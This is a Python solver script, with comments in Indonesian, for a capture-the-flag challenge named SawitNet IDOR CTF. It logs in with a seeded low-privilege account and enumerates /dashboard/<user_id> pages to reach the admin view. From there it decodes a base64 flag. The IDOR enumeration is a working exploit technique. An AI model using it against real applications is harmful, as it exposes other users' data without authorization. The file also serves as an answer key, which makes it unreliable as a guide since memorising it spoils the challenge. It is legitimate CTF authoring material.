#!/usr/bin/env python3
"""
Solver otomatis — SawitNet IDOR CTF (AUTHOR-ONLY, jangan dibagikan ke player).

Chain:
    login (mitra biasa) -> IDOR /dashboard/<user_id> -> decode base64 -> FLAG

Usage:
    python3 solve.py [base_url]
    python3 solve.py http://localhost:5000

Requires: requests  (pip install requests)
"""
import sys
import base64
import re

import requests

BASE_URL = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000").rstrip("/")

# Akun mitra biasa (lihat README / chall.md)
USERNAME = "budi_santoso"
PASSWORD = "budi123"

MAX_ID = 50  # ruang enumerasi user_id (cukup untuk 20 user seed)


def decode_flag(raw: str):
    """Decode base64 (maks 3 layer) sampai ketemu pola TCC{...}."""
    val = raw
    for _ in range(3):
        try:
            dec = base64.b64decode(val, validate=True).decode()
        except Exception:
            return None
        if dec.startswith("TCC{"):
            return dec
        val = dec
    return None


def main() -> int:
    s = requests.Session()

    # 1) Login sebagai mitra biasa
    r = s.post(
        f"{BASE_URL}/login",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=True,
        timeout=10,
    )
    if r.status_code != 200:
        print(f"[-] Login gagal (HTTP {r.status_code})")
        return 1
    print(f"[+] Login sebagai {USERNAME}")

    # 2) Enumerasi user_id -> cari dashboard admin (yang memuat flag_b64)
    for uid in range(1, MAX_ID + 1):
        resp = s.get(f"{BASE_URL}/dashboard/{uid}", timeout=10)
        if resp.status_code != 200:
            continue

        m = re.search(r'class="mono"[^>]*>\s*([A-Za-z0-9+/=]{16,})\s*<', resp.text)
        if not m:
            continue

        flag = decode_flag(m.group(1).strip())
        if flag:
            print(f"[+] IDOR berhasil: user_id={uid} adalah administrator")
            print(f"[+] FLAG: {flag}")
            return 0

    print("[-] Flag tidak ditemukan (naikkan MAX_ID atau cek konfigurasi FLAG_B64)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
